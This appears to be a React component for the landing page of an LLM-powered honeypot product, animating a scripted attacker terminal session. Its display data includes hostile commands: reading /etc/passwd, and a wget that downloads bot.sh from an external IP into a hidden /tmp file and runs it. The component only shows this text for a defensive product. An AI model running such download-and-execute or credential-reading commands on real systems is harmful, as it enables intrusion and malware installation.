import styles from './HeroTerminal.module.css';
import { useState, useEffect, useRef } from 'react';

const heroLines = [
  {type:'sys', text:'Connected to BinaryPot v1.0.0 (LLM Engine: GPT-4)'},
  {type:'sys', text:'Recording session BP-02847 from 185.220.101.34 [RU]'},
  {type:'prompt', text:'root@victim-server:~# '},
  {type:'cmd', text:'whoami'},
  {type:'out', text:'root'},
  {type:'prompt', text:'root@victim-server:~# '},
  {type:'cmd', text:'cat /etc/passwd'},
  {type:'out', text:'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'},
  {type:'prompt', text:'root@victim-server:~# '},
  {type:'cmd', text:'wget http://185.62.188.x/bot.sh -O /tmp/.x'},
  {type:'err', text:'--2024-01-15 03:47:12-- http://185.62.188.x/bot.sh\nConnecting...connected. HTTP request sent, awaiting response... 200 OK'},
  {type:'prompt', text:'root@victim-server:~# '},
  {type:'cmd', text:'chmod +x /tmp/.x && /tmp/.x'},
  {type:'sys', text:'[LLM] Generating realistic response to maintain attacker engagement...'},
];

const HeroTerminal = () => {
  const [visibleLines, setVisibleLines] = useState([]);
  const [lineIndex, setLineIndex] = useState(0);
  const terminalRef = useRef(null);

  useEffect(() => {
    if (lineIndex >= heroLines.length) {
      const timeout = setTimeout(() => {
        setVisibleLines([]);
        setLineIndex(0);
      }, 3000);
      return () => clearTimeout(timeout);
    }

    const line = heroLines[lineIndex];
    let delay = 500;
    if (line.type === 'prompt') delay = 800;
    if (line.type === 'sys') delay = 200;

    const timeout = setTimeout(() => {
      setVisibleLines(prev => [...prev, line]);
      setLineIndex(prev => prev + 1);
    }, delay);

    return () => clearTimeout(timeout);
  }, [lineIndex]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [visibleLines]);

  return (
    <div className={styles.heroTerminal}>
      <div className={styles.termHeader}>
        <div className={styles.termDots}>
          <span className={styles.dotR}></span><span className={styles.dotY}></span><span className={styles.dotG}></span>
        </div>
        <div className={styles.termTitle}>root@victim-server:~#</div>
      </div>
      <div className={styles.termBody} ref={terminalRef}>
        {visibleLines.map((line, i) => (
          <div key={i} className={styles[line.type]}>
            {line.text}
            {line.type === 'prompt' && <span className={styles.cursor}></span>}
          </div>
        ))}
      </div>
    </div>
  );
};

export default HeroTerminal;
